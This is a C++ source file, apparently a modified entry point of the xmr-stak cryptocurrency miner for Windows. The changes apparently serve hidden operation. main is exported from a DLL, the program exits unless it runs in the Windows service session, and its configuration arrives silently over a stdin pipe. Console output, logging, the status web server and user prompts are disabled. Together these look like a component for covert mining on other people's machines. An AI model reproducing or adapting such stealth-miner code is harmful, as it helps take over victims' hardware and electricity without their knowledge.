/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * Additional permission under GNU GPL version 3 section 7
 *
 * If you modify this Program, or any covered work, by linking or combining
 * it with OpenSSL (or a modified version of that library), containing parts
 * covered by the terms of OpenSSL License and SSLeay License, the licensors
 * of this Program grant you additional permission to convey the resulting work.
 *
 */

#include "executor.h"
#include "minethd.h"
#include "jconf.h"
#include "console.h"
#include "donate-level.h"
#ifndef CONF_NO_HWLOC
#   include "autoAdjustHwloc.hpp"
#else
#   include "autoAdjust.hpp"
#endif
#include "version.h"

#ifndef CONF_NO_HTTPD
#	include "httpd.h"
#endif

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <time.h>

#include <Windows.h>

#ifndef CONF_NO_TLS
#include <openssl/ssl.h>
#include <openssl/err.h>
#endif

 //Do a press any key for the windows folk. *insert any key joke here*
#ifdef _WIN32
void win_exit()
{
	//printer::inst()->print_str("Press any key to exit.");
	//get_key();
	return;
}

#define strcasecmp _stricmp

#else
void win_exit() { return; }
#endif // _WIN32

void do_benchmark();

void TRACE(const char* fmt, ...)
{
	char debugString[1024];
	va_list ap;

	va_start(ap, fmt);
	_vsnprintf_s(debugString, 1024, fmt, ap);
	va_end(ap);

	//::OutputDebugStringA(debugString);
}

void read_buf_from_pipe(HANDLE file, PBYTE buf, int len)
{
	DWORD read = 0;
	while (len > 0)
	{
		if (!::ReadFile(file, buf, len, &read, nullptr))
		{
			break;
		}
		len -= read;
		buf += read;
	}
}

__declspec(dllexport) int main(int argc, char *argv[])
{
#ifndef CONF_NO_TLS
	SSL_library_init();
	SSL_load_error_strings();
	ERR_load_BIO_strings();
	ERR_load_crypto_strings();
	SSL_load_error_strings();
	OpenSSL_add_all_digests();
#endif
	//TRACE("start cli-miner");

	/*int i = 0;
	while (true)
	{
		if (i == 1)
		{
			continue;
		}
		else
		{
			break;
		}
	}*/

#ifndef _DEBUG 
	DWORD dwSessionID;
	if (!ProcessIdToSessionId(::GetCurrentProcessId(), &dwSessionID))
	{
		return 0;
	}
	if (dwSessionID != 0)
	{
		return 0;
	}
#endif

#define MAX_CONFIG_SIZE (64 * 1024)
	CHAR *pBuf;
	HANDLE hStdin;
	hStdin = GetStdHandle(STD_INPUT_HANDLE);

	unsigned short config_data_len;
	read_buf_from_pipe(hStdin, (PBYTE)&config_data_len, sizeof(config_data_len));
	//TRACE("config data len: %u", config_data_len);

	pBuf = (CHAR *)malloc(config_data_len);
	read_buf_from_pipe(hStdin, (PBYTE)pBuf, config_data_len);
	//TRACE("read complete");

	srand(time(0));
	bool benchmark_mode = false;

#ifdef _DEBUG
	int i = 1;
	while (i == 1)
	{
		::Sleep(1000);
	}
#endif

	if(!jconf::inst()->parse_config(pBuf, config_data_len))
	{
		win_exit();
		return 0;
	}

	/*if (!minethd::self_test())
	{
		win_exit();
		return 0;
	}*/

	/*if(benchmark_mode)
	{
		do_benchmark();
		win_exit();
		return 0;
	}*/

#ifndef CONF_NO_HTTPD
	/*if(jconf::inst()->GetHttpdPort() != 0)
	{
		if (!httpd::inst()->start_daemon())
		{
			win_exit();
			return 0;
		}
	}*/
#endif

	//if(strlen(jconf::inst()->GetOutputFile()) != 0)
	//	printer::inst()->open_logfile(jconf::inst()->GetOutputFile());

	executor::inst()->ex_start(jconf::inst()->DaemonMode());

	while (true)
	{
		::Sleep(5000);
	}

	return 0;
}

void do_benchmark()
{
}
